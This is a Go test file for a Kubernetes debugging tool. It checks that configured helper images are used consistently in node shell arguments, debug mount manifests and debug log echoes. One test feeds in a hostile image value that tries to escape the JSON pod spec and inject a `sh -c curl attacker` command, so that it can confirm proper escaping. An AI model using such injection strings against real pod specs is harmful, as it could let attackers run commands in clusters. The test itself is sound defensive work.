package app

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/janosmiko/lfk/internal/images"
)

// withImageConfig points every helper image at a test registry and restores
// the globals afterwards.
func withImageConfig(t *testing.T, apply func()) {
	t.Helper()
	reg, dbg := images.ConfigRegistry, images.ConfigDebug
	pod, mnt := images.ConfigDebugPod, images.ConfigDebugMount
	node, tcap := images.ConfigNodeShell, images.ConfigTrafficCapture
	t.Cleanup(func() {
		images.ConfigRegistry, images.ConfigDebug = reg, dbg
		images.ConfigDebugPod, images.ConfigDebugMount = pod, mnt
		images.ConfigNodeShell, images.ConfigTrafficCapture = node, tcap
	})
	apply()
}

// The node shell writes its image twice — into the --overrides spec and into
// the --image flag. Both must name the configured image, or kubectl applies a
// spec that disagrees with the flag.
func TestNodeShellArgs_HonorsConfiguredImage(t *testing.T) {
	withImageConfig(t, func() {
		images.ConfigRegistry = "registry.internal:5000"
		images.ConfigNodeShell = "ops/toolbox:2"
	})

	podName := "lfk-node-shell-abc12"
	overrides, err := nodeShellOverrides(podName, "node-1")
	require.NoError(t, err)
	args := nodeShellArgs(podName, "test-ns", "test-ctx", overrides)

	want := "registry.internal:5000/ops/toolbox:2"
	assert.Contains(t, args, "--image="+want, "--image flag must use the configured image")

	var spec struct {
		Spec struct {
			Containers []struct{ Image string } `json:"containers"`
		} `json:"spec"`
	}
	require.NoError(t, json.Unmarshal([]byte(overrides), &spec))
	require.Len(t, spec.Spec.Containers, 1)
	assert.Equal(t, want, spec.Spec.Containers[0].Image, "override spec must use the same image as the flag")
}

func TestNodeShellArgs_DefaultsWhenUnconfigured(t *testing.T) {
	withImageConfig(t, func() {
		images.ConfigRegistry, images.ConfigNodeShell = "", ""
	})

	podName := "lfk-node-shell-abc12"
	overrides, err := nodeShellOverrides(podName, "node-1")
	require.NoError(t, err)
	args := nodeShellArgs(podName, "test-ns", "test-ctx", overrides)

	assert.Contains(t, args, "--image="+images.DefaultNodeShell)
	assert.Contains(t, overrides, `"image":"`+images.DefaultNodeShell+`"`)
}

// The Debug Mount manifest interpolates the image into a JSON pod spec. A
// value carrying a quote must not be able to escape the string and rewrite
// the spec — it has to arrive as a single JSON string.
func TestDebugMountManifest_ImageIsJSONEscaped(t *testing.T) {
	hostile := `evil","command":["sh","-c","curl attacker"],"x":"`
	manifest, err := debugMountManifest("lfk-debug-pvc-abc12", "my-pvc", hostile)
	require.NoError(t, err)

	var spec struct {
		Spec struct {
			Containers []struct {
				Image   string   `json:"image"`
				Command []string `json:"command"`
			} `json:"containers"`
		} `json:"spec"`
	}
	require.NoError(t, json.Unmarshal([]byte(manifest), &spec), "manifest must stay valid JSON")
	require.Len(t, spec.Spec.Containers, 1)
	assert.Equal(t, hostile, spec.Spec.Containers[0].Image,
		"the whole value must land in the image field, not split across keys")
	assert.Equal(t, []string{"sh"}, spec.Spec.Containers[0].Command,
		"command must not be overridable through the image value")
}

func TestDebugMountManifest_UsesConfiguredImage(t *testing.T) {
	withImageConfig(t, func() {
		images.ConfigRegistry = "registry.internal:5000"
		images.ConfigDebugMount = "ops/inspect:4"
	})

	manifest, err := debugMountManifest("lfk-debug-pvc-abc12", "my-pvc", images.DebugMount())
	require.NoError(t, err)
	assert.Contains(t, manifest, `"image": "registry.internal:5000/ops/inspect:4"`)
	assert.Contains(t, manifest, `"claimName": "my-pvc"`)
}

// The DBG command echo is what the user reads to reproduce an action by hand.
// It must report the image that actually ran, not a stale literal.
func TestDebugActionLogEcho_ReportsConfiguredImage(t *testing.T) {
	withImageConfig(t, func() {
		images.ConfigRegistry = "registry.internal:5000"
		images.ConfigDebug = "toolbox:3"
		images.ConfigDebugPod = "pod-tools:1"
		images.ConfigDebugMount = "mount-tools:1"
		images.ConfigNodeShell = "node-tools:1"
	})

	tests := []struct {
		name   string
		action func(Model) (Model, string)
	}{
		{"Debug", func(m Model) (Model, string) {
			mdl, _ := m.executeActionDebug()
			return mdl.(Model), "registry.internal:5000/toolbox:3"
		}},
		{"Debug Pod", func(m Model) (Model, string) {
			mdl, _ := m.executeActionDebugPod()
			return mdl.(Model), "registry.internal:5000/pod-tools:1"
		}},
		{"Debug Mount", func(m Model) (Model, string) {
			mdl, _ := m.executeActionDebugMount()
			return mdl.(Model), "registry.internal:5000/mount-tools:1"
		}},
		{"Node Shell", func(m Model) (Model, string) {
			mdl, _ := m.executeActionShell()
			return mdl.(Model), "registry.internal:5000/node-tools:1"
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			m := basePush80Model()
			m.actionCtx = actionContext{name: "target", namespace: "ns", context: "test-ctx"}
			got, want := tt.action(m)

			var echo string
			for _, e := range got.errorLog {
				if strings.Contains(e.Message, "--image=") {
					echo = e.Message
					break
				}
			}
			require.NotEmpty(t, echo, "no DBG entry carrying --image=")
			assert.Contains(t, echo, "--image="+want)
		})
	}
}
